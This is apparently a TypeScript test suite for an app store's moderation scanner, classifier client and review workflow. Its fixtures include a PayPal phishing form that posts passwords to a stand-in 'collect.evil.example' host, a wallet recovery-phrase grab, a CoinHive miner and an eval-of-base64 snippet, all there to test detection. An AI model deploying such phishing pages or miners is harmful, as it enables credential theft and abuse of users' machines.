// The moderation site: the rules, the classifier client, and the whole loop
// with the store and the moderation site sharing one database.
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, describe, it } from "node:test";
import { migrate, openDb } from "../db.ts";
import { classify, QUESTIONS } from "../moderation/jev.ts";
import { scanRelease } from "../moderation/scan.ts";
import { createModeration } from "../moderation/server.ts";
import { createStore } from "../server.ts";
import { call, manifest, sha256, tgz } from "./helpers.ts";

const HTML = "text/html; charset=utf-8";
const JS = "text/javascript; charset=utf-8";

/** A bundle with typed files: { path: [type, text] }. */
async function appBundle(files: Record<string, [string, string]>, source = 'export default { fetch() { return new Response("hi"); } }', version = "aaaaaaaaaaaa") {
	const code = {
		compatibilityDate: "2026-10-01",
		source,
		files: Object.fromEntries(Object.entries(files).map(([path, [type, text]]) => [path, [sha256(text), type]])),
		immutable: [],
		mutable: [],
		notFound: "none",
		check: "/",
	};
	const blobs = new Map(Object.values(files).map(([, text]) => [sha256(text), text]));
	return tgz([{ name: "version", data: `${version}\n` }, { name: "code.json", data: JSON.stringify(code) }, ...[...blobs].map(([hash, text]) => ({ name: `blobs/${hash}`, data: text }))]);
}

const scanOf = (files: Record<string, [string, string]>, over: Record<string, unknown> = {}, source = "") =>
	scanRelease({
		manifest: manifest(over),
		source,
		files: Object.entries(files).map(([path, [type, text]]) => ({ path, type, size: text.length, text })),
	});
const top = (r: ReturnType<typeof scanRelease>) => r.findings[0]?.risk ?? 0;
const rules = (r: ReturnType<typeof scanRelease>) => r.findings.map((f) => f.rule);

const BENIGN = `<!doctype html><title>Chore board</title><h1>Chores</h1><form><input name="chore" placeholder="Take out the bins"><button>Add</button></form>`;
const PHISH = `<!doctype html><title>PayPal - Sign in</title><h1>Verify your PayPal account</h1>
	<form action="https://collect.evil.example/p" method="post"><input name="email"><input type="password" name="pw"><button>Log in</button></form>`;

describe("moderation rules", () => {
	it("finds nothing worth a look in a plain app", () => {
		const r = scanOf({ "index.html": [HTML, BENIGN], "app.js": [JS, 'document.querySelector("form").onsubmit = (e) => { e.preventDefault(); }'] });
		assert.ok(top(r) < 0.4, JSON.stringify(r.findings));
		assert.equal(r.pages[0].title, "Chore board");
		assert.deepEqual(r.forms[0].fields, ["input:chore:Take out the bins"]);
	});

	it("blocks a page that posts a password to another server", () => {
		const r = scanOf({ "index.html": [HTML, PHISH] });
		assert.equal(r.findings[0].rule, "form.password-elsewhere");
		assert.equal(top(r), 1);
		assert.ok(rules(r).includes("asks.brand-login"));
	});

	it("flags a brand login built in JavaScript", () => {
		const js = `const v = h("div", null, ">Sign in to your Microsoft account<"); input({ type: "password", placeholder: "Password" }); fetch("/api/login")`;
		const r = scanOf({ "index.html": [HTML, "<div id=app></div>"], "app.js": [JS, js] });
		assert.ok(rules(r).includes("asks.brand-login"), JSON.stringify(r.findings));
		assert.ok(top(r) >= 0.4 && top(r) < 0.9);
	});

	it("blocks miners and wallet recovery-phrase grabs", () => {
		assert.equal(top(scanOf({ "m.js": [JS, 'new CoinHive.Anonymous("key").start()'] })), 1);
		assert.equal(top(scanOf({}, {}, 'const pool = "stratum+tcp://pool.example:3333"')), 1, "server code is scanned too");
		const seed = scanOf({ "index.html": [HTML, "<h1>MetaMask wallet sync</h1><p>Enter your 12-word recovery phrase to restore your wallet.</p><textarea></textarea>"] });
		assert.ok(top(seed) >= 0.9, JSON.stringify(seed.findings));
	});

	it("sends trackers, remote code, risky hosts and brand names to review", () => {
		for (const [files, over, rule] of [
			[{ "index.html": [HTML, '<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>'] }, {}, "code.tracker"],
			[{ "index.html": [HTML, '<script src="https://cdn.example.net/lib.js"></script>'] }, {}, "script.remote"],
			[{}, { egress: ["discord.com"] }, "egress.risky"],
			[{}, { name: "PayPal Helper" }, "listing.brand"],
			[{ "a.js": [JS, "eval(atob('ZG9jdW1lbnQ='))"] }, {}, "code.eval-decoded"],
		] as const) {
			const r = scanOf(files as any, over as any);
			assert.ok(rules(r).includes(rule), `${rule}: ${JSON.stringify(r.findings)}`);
			assert.ok(top(r) >= 0.4 && top(r) < 0.9, rule);
		}
	});

	it("flags a form that asks for card details", () => {
		const r = scanOf({ "index.html": [HTML, '<h1>You won!</h1><form><input name="card" placeholder="Card number"><input name="cvc"><button>Claim</button></form>'] });
		assert.equal(r.findings[0].rule, "asks.payment");
		assert.ok(top(r) >= 0.4 && top(r) < 0.9);
		assert.ok(top(scanOf({ "index.html": [HTML, BENIGN] })) < 0.4, "a chore field is not a card field");
	});

	it("lists other hosts the app mentions, without the usual noise", () => {
		const r = scanOf({ "a.js": [JS, 'fetch("https://api.weather.dev/v1"); const ns = "http://www.w3.org/2000/svg";'] });
		assert.deepEqual(r.externalHosts, ["api.weather.dev"]);
	});
});

describe("classifier client", () => {
	let server;
	let url: string;
	let last: any;
	let answer: (body: any) => [number, unknown];
	before(async () => {
		server = createServer(async (req, res) => {
			let body = "";
			for await (const chunk of req) body += chunk;
			last = { headers: req.headers, body: JSON.parse(body) };
			const [status, payload] = answer(last.body);
			res.writeHead(status, { "content-type": "application/json" }).end(JSON.stringify(payload));
		});
		await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
		url = `http://127.0.0.1:${(server.address() as AddressInfo).port}/v1/systemone`;
	});
	after(() => server.close());

	it("sends the documented request and reads typed answers", async () => {
		answer = () => [
			200,
			{
				model: "jev-1.13.0",
				answers: {
					harm: { type: "score", score: 3.6, confidence: 0.8 },
					kind: { type: "choice", choice: "credential_theft", confidence: 0.9, probabilities: { credential_theft: 0.9, utility: 0.1 } },
					impersonation: { type: "noul", noul: 0.97 },
					collects_secrets: { type: "noul", noul: 0.99 },
				},
			},
		];
		const c = await classify({ url, apiKey: "k", model: "jev-latest" }, { listing: { name: "x" } });
		assert.equal(last.headers.authorization, "Bearer k");
		assert.equal(last.body.model, "jev-latest");
		assert.deepEqual(Object.keys(last.body.questions), Object.keys(QUESTIONS));
		assert.equal(last.body.questions.harm.type, "score");
		assert.equal(last.body.questions.kind.type, "choice");
		assert.equal(last.body.questions.impersonation.type, "noul");
		assert.equal(c.risk, 0.9);
		assert.equal(c.kind.choice, "credential_theft");
		assert.equal(c.collectsSecrets, 0.99);
	});

	it("fails loudly on errors and malformed answers", async () => {
		answer = () => [429, { error: "slow down" }];
		await assert.rejects(classify({ url, model: "m" }, {}), /429/);
		answer = () => [200, { answers: {} }];
		await assert.rejects(classify({ url, model: "m" }, {}), /no harm score/);
	});
});

describe("store and moderation on one database", () => {
	const dir = mkdtempSync(join(tmpdir(), "store-moderation-test-"));
	let db;
	let store;
	let moderation;
	let storeBase: string;
	let modBase: string;
	let jev;
	let jevAnswer = 0.2;
	let cookie = "";
	let csrf = "";

	before(async () => {
		// A stand-in classifier: risk from the harm score we set per test.
		jev = createServer(async (req, res) => {
			for await (const _ of req);
			res.writeHead(200, { "content-type": "application/json" }).end(
				JSON.stringify({
					model: "jev-test",
					answers: {
						harm: { score: jevAnswer * 4, confidence: 0.9 },
						kind: { choice: jevAnswer > 0.5 ? "scam_or_spam" : "utility", confidence: 0.9, probabilities: {} },
						impersonation: { noul: 0.1 },
						collects_secrets: { noul: 0.1 },
					},
				}),
			);
		});
		await new Promise<void>((r) => jev.listen(0, "127.0.0.1", () => r()));
		db = await openDb({ url: process.env.STORE_TEST_DATABASE_URL, dir: process.env.STORE_TEST_DATABASE_URL ? undefined : join(dir, "pg") });
		await migrate(db);
		store = createStore({ dataDir: dir, db, requireReview: true, rateLimit: false, logging: false });
		storeBase = `http://127.0.0.1:${(await store.listen(0, "127.0.0.1")).port}`;
		moderation = createModeration({
			db,
			dataDir: dir,
			password: "moderator password",
			worker: false,
			logging: false,
			classifier: { url: `http://127.0.0.1:${(jev.address() as AddressInfo).port}/v1/systemone`, model: "jev-test" },
		});
		modBase = `http://127.0.0.1:${(await moderation.listen(0, "127.0.0.1")).port}`;
	});
	after(async () => {
		await moderation.close();
		await store.close();
		await db.close();
		jev.close();
		rmSync(dir, { recursive: true, force: true });
	});

	async function publisher(name: string) {
		const res = await call(storeBase, "/api/v1/publishers", { method: "POST", json: { name, password: "correct horse battery", acceptPolicy: true } });
		assert.equal(res.status, 201, res.text);
		return res.body.token;
	}
	async function submit(token: string, slug: string, version: string, files: Record<string, [string, string]>, over: Record<string, unknown> = {}) {
		const ns = (await call(storeBase, "/api/v1/me", { token })).body.publisher.name;
		const created = await call(storeBase, `/api/v1/apps/${ns}/${slug}/releases`, { method: "POST", token, json: { manifest: manifest({ slug, name: slug, version, ...over }) } });
		assert.equal(created.status, 201, created.text);
		const up = await call(storeBase, created.body.upload.url, { method: "PUT", token, body: await appBundle(files), headers: { "content-type": "application/gzip" } });
		assert.equal(up.status, 201, up.text);
		return up.body.release.id as number;
	}
	const check = (id: number) => db.one("SELECT * FROM moderation_checks WHERE release_id = $1", [id]);
	const status = async (id: number) => (await db.one("SELECT status FROM releases WHERE id = $1", [id])).status;
	async function page(path: string) {
		const res = await fetch(modBase + path, { headers: { cookie }, redirect: "manual" });
		return { status: res.status, text: await res.text(), location: res.headers.get("location") };
	}
	async function post(path: string, fields: Record<string, string> = {}, headers: Record<string, string> = {}) {
		const res = await fetch(modBase + path, {
			method: "POST",
			headers: { cookie, "content-type": "application/x-www-form-urlencoded", ...headers },
			body: new URLSearchParams({ _csrf: csrf, ...fields }),
			redirect: "manual",
		});
		return { status: res.status, location: res.headers.get("location") ?? "", text: await res.text() };
	}

	it("signs moderators in with the shared password and their name", async () => {
		assert.equal((await page("/")).location, "/login");
		const wrong = await fetch(`${modBase}/login`, { method: "POST", body: new URLSearchParams({ name: "ada", password: "nope" }), headers: { "content-type": "application/x-www-form-urlencoded" }, redirect: "manual" });
		assert.equal(wrong.status, 401);
		const ok = await fetch(`${modBase}/login`, { method: "POST", body: new URLSearchParams({ name: "ada", password: "moderator password" }), headers: { "content-type": "application/x-www-form-urlencoded" }, redirect: "manual" });
		assert.equal(ok.status, 303);
		const set = ok.headers.get("set-cookie");
		assert.match(set, /HttpOnly; SameSite=Strict/);
		cookie = set.split(";")[0];
		const queue = await page("/");
		assert.equal(queue.status, 200);
		csrf = /name="_csrf" value="([^"]+)"/.exec(queue.text)[1];
	});

	it("checks a plain release and leaves it for a person", async () => {
		const token = await publisher("honest");
		const id = await submit(token, "chores", "1.0.0", { "index.html": [HTML, BENIGN] });
		assert.equal(await moderation.checker.tick(), 1);
		const c = await check(id);
		assert.equal(c.verdict, "allow");
		assert.equal(c.classifier.model, "jev-test");
		assert.equal(await status(id), "pending", "nobody approved it yet");
		const queue = await page("/");
		assert.match(queue.text, /chores@1\.0\.0/);
	});

	it("approves from the release page, and the store lists it", async () => {
		const { id } = await db.one("SELECT r.id FROM releases r JOIN apps a ON a.id = r.app_id WHERE a.slug = 'chores'");
		const detail = await page(`/releases/${id}`);
		assert.match(detail.text, /Approve and publish/);
		// A form from elsewhere, or without this session's token, does nothing.
		assert.equal((await post(`/releases/${id}/approve`, { _csrf: "forged" })).status, 403);
		assert.equal((await post(`/releases/${id}/approve`, {}, { origin: "https://evil.example" })).status, 403);
		assert.equal((await post(`/releases/${id}/approve`, {}, { origin: "null" })).status, 403);
		assert.equal(await status(id), "pending");
		const done = await post(`/releases/${id}/approve`);
		assert.equal(done.status, 303);
		assert.equal(await status(id), "published");
		assert.equal((await call(storeBase, "/api/v1/apps/honest/chores")).status, 200);
		const event = await db.one("SELECT * FROM events WHERE action = 'release.approve'");
		assert.equal(event.actor, "ada");
	});

	it("blocks a phishing release on its own and tells the publisher only that much", async () => {
		const token = await publisher("phisher");
		const id = await submit(token, "pp-verify", "1.0.0", { "index.html": [HTML, PHISH] });
		await moderation.checker.tick();
		const c = await check(id);
		assert.equal(c.verdict, "block");
		assert.equal(c.action, "rejected");
		assert.equal(await status(id), "rejected");
		const me = await call(storeBase, "/api/v1/me", { token });
		const note = me.body.apps[0].releases[0].reviewNote;
		assert.match(note, /automatic checks blocked/);
		assert.doesNotMatch(note, /evil\.example|password/i, "the rule details stay with moderators");
		// Moderators see why, with the evidence escaped.
		const detail = await page(`/releases/${id}`);
		assert.match(detail.text, /Sends a password to collect\.evil\.example/);
		const file = await page(`/releases/${id}/file?path=index.html`);
		assert.match(file.text, /&lt;form action=&quot;https:\/\/collect\.evil\.example\/p&quot;/);
		assert.doesNotMatch(file.text, /<form action="https:\/\/collect/);
		assert.match((await page("/blocked")).text, /pp-verify@1\.0\.0/);
	});

	it("uses the classifier's score when the rules see nothing", async () => {
		const token = await publisher("spammy");
		jevAnswer = 0.75;
		const id = await submit(token, "prize", "1.0.0", { "index.html": [HTML, "<h1>You won!</h1>"] });
		await moderation.checker.tick();
		jevAnswer = 0.2;
		const c = await check(id);
		assert.equal(c.verdict, "review");
		assert.equal(Number(c.risk.toFixed(2)), 0.75);
		assert.equal(await status(id), "pending");
	});

	it("publishes low-risk releases of trusted publishers without waiting", async () => {
		const token = await publisher("regular");
		const { id: pid } = await db.one("SELECT id FROM publishers WHERE name = 'regular'");
		assert.equal((await post(`/publishers/${pid}/trust`)).status, 303);
		const id = await submit(token, "notes", "1.0.0", { "index.html": [HTML, BENIGN] });
		await moderation.checker.tick();
		assert.equal(await status(id), "published");
		assert.equal((await check(id)).action, "published");
		// A risky release from the same publisher still waits.
		const risky = await submit(token, "notes", "1.1.0", { "index.html": [HTML, '<script src="https://cdn.example.net/x.js"></script>'] });
		await moderation.checker.tick();
		assert.equal(await status(risky), "pending");
	});

	it("holds back a trusted publisher's update that asks for new network access or follows fresh credentials", async () => {
		const token = await publisher("steady");
		const { id: pid } = await db.one("SELECT id FROM publishers WHERE name = 'steady'");
		// An established account: older than three days, its token too.
		await db.run("UPDATE publishers SET trusted = true, created_at = now() - interval '30 days' WHERE id = $1", [pid]);
		await db.run("UPDATE tokens SET created_at = now() - interval '30 days' WHERE publisher_id = $1", [pid]);
		const first = await submit(token, "weather", "1.0.0", { "index.html": [HTML, BENIGN] }, { egress: ["api.weather.dev"] });
		await moderation.checker.tick();
		assert.equal(await status(first), "published", "low risk and trusted: straight out");

		const wider = await submit(token, "weather", "1.1.0", { "index.html": [HTML, BENIGN] }, { egress: ["api.weather.dev", "collector.dev"] });
		await moderation.checker.tick();
		assert.equal(await status(wider), "pending");
		assert.ok((await check(wider)).findings.some((f) => f.rule === "update.new-egress" && /collector\.dev/.test(f.title)));

		// The same publisher after a password change: a stolen account looks like this.
		await db.run("UPDATE publishers SET password_changed_at = now() WHERE id = $1", [pid]);
		const fresh = await submit(token, "weather", "1.2.0", { "index.html": [HTML, BENIGN] }, { egress: ["api.weather.dev"] });
		await moderation.checker.tick();
		assert.equal(await status(fresh), "pending");
		assert.ok((await check(fresh)).findings.some((f) => f.rule === "account.fresh-credentials"));
	});

	it("flags a publisher whose name is one letter from another's", async () => {
		const token = await publisher("steadx");
		const id = await submit(token, "clock", "1.0.0", { "index.html": [HTML, BENIGN] });
		await moderation.checker.tick();
		const c = await check(id);
		assert.equal(c.verdict, "review");
		assert.match(c.findings[0].title, /one letter away from "steady"/);
	});

	it("rejects with a reason, takes down, and reverses", async () => {
		const { id: prize } = await db.one("SELECT r.id FROM releases r JOIN apps a ON a.id = r.app_id WHERE a.slug = 'prize'");
		assert.equal((await post(`/releases/${prize}/reject`, { note: "x" })).status, 400, "a reason is required");
		assert.equal((await post(`/releases/${prize}/reject`, { note: "Fake prize page." })).status, 303);
		assert.equal((await db.one("SELECT review_note FROM releases WHERE id = $1", [prize])).review_note, "Fake prize page.");

		const { id: chores } = await db.one("SELECT r.id FROM releases r JOIN apps a ON a.id = r.app_id WHERE a.slug = 'chores'");
		await call(storeBase, "/api/v1/apps/honest/chores/releases/1.0.0/report", { method: "POST", json: { reason: "It asks for my bank login." } });
		assert.match((await page("/reports")).text, /It asks for my bank login\./);
		assert.match((await page("/flagged")).text, /chores@1\.0\.0/, "a report flags a published release");
		assert.equal((await post(`/releases/${chores}/reject`, { note: "Asks for bank logins." })).status, 303);
		assert.equal((await call(storeBase, "/api/v1/apps/honest/chores")).status, 404);
		assert.equal(Number((await db.one("SELECT count(*)::int AS n FROM reports WHERE NOT resolved")).n), 0, "taking it down closes its reports");

		assert.equal((await post(`/releases/${chores}/approve`)).status, 303);
		assert.equal((await call(storeBase, "/api/v1/apps/honest/chores")).status, 200, "reversed within the keep time");
	});

	it("removes a published release whose bundle file is lost", async () => {
		const token = await publisher("unlucky");
		const pid = await submit(token, "lost", "1.0.0", { "index.html": [HTML, BENIGN] });
		assert.equal((await post(`/releases/${pid}/approve`)).status, 303);
		assert.equal((await post(`/releases/${pid}/remove`, { note: "Lost file." })).status, 409, "only when the file is really gone");
		const { bundle_sha } = await db.one("SELECT bundle_sha FROM releases WHERE id = $1", [pid]);
		rmSync(join(dir, "blobs", `${bundle_sha}.tgz`));
		assert.match((await page(`/releases/${pid}`)).text, /Remove this release/);
		assert.equal((await post(`/releases/${pid}/remove`, { note: "The store lost this file." })).status, 303);
		assert.equal(await status(pid), "removed");
		assert.equal((await call(storeBase, "/api/v1/apps/unlucky/lost")).status, 404);
		assert.equal((await call(storeBase, "/api/v1/me", { token })).body.apps[0].releases[0].reviewNote, "The store lost this file.");
		assert.ok((await submit(token, "lost", "1.0.1", { "index.html": [HTML, BENIGN] })) > 0, "a new version is fine");
	});

	it("suspends a publisher from the moderation site", async () => {
		const { id } = await db.one("SELECT id FROM publishers WHERE name = 'regular'");
		assert.equal((await post(`/publishers/${id}/suspend`, { reason: "Spam apps." })).status, 303);
		assert.equal((await call(storeBase, "/api/v1/apps/regular/notes")).status, 404);
		const login = await call(storeBase, "/api/v1/tokens", { method: "POST", json: { name: "regular", password: "correct horse battery" } });
		assert.equal(login.status, 403);
		assert.equal((await post(`/publishers/${id}/unsuspend`)).status, 303);
		assert.equal((await call(storeBase, "/api/v1/apps/regular/notes")).status, 200);
	});

	it("pauses sign-ups from Settings", async () => {
		assert.equal((await post("/settings", { key: "registration", value: "0" })).status, 303);
		await new Promise((r) => setTimeout(r, 5100));
		const res = await call(storeBase, "/api/v1/publishers", { method: "POST", json: { name: "late", password: "correct horse battery", acceptPolicy: true } });
		assert.equal(res.status, 503);
		await post("/settings", { key: "registration", value: "1" });
		assert.match((await page("/log")).text, /settings\.change/);
	});

	it("signs out", async () => {
		assert.equal((await post("/logout")).status, 303);
		assert.equal((await page("/")).location, "/login");
	});
});
